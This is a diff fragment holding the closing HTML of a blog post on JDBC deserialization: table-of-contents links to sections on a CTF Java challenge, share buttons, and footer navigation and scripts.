class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java"><span class="toc-number">2.5.</span> <span class="toc-text">例题  [羊城杯 2020]A Piece Of Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.5.1.</span> <span class="toc-text">分析代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0gadget"><span class="toc-number">2.5.2.</span> <span class="toc-text">构造gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">动态代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.5.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.4.</span> <span class="toc-text">题目总结</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/04/11/blog35/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/04/11/blog35/&text=JDBC反序列化"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/04/11/blog35/&is_video=false&description=JDBC反序列化"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JDBC反序列化&body=Check out this article: https://q1ng-li.github.io/2026/04/11/blog35/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/04/11/blog35/&name=JDBC反序列化&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 q1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
